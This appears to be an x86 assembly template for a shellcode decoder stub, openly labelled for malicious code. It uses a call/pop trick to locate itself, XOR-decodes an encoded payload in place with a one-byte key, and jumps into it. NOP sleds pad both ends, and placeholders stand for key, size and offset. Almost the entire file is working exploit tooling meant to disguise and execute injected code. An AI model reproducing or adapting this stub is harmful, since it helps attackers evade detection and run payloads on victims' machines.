global _start
  
section .text

_start:
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    
; -------------------------------------------
; enter malicious code here
; -------------------------------------------
    
    call    get_proc                    ; push return address
    
get_proc:
    pop     esi                         ; pop current address
    sub     esi, 0x5                    ; esi = address of injected code, 0x5 = size of call instruction
    sub     esi, <CODE_BOTTOM_OFFSET>   ; esi = address of last code byte
    
    xor     ebx, ebx                    ; clear registers
    xor     ecx, ecx                    ;
    
    mov     bl,  <DECODER_KEY>          ; decoder key
    mov     ecx, <CODE_SIZE>            ; encoded code size
    
    sub     esi, ecx                    ; esi = address of encoded code

decoder_loop:
    mov     edx, esi                    ; construct encoded byte address
    add     edx, ecx                    ;
    dec     edx                         ;
    xor     byte [edx], bl              ; decode
    loop    decoder_loop                ; loop back
    
    jmp     esi                         ; jump back to decoded code
    
; -------------------------------------------
    
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop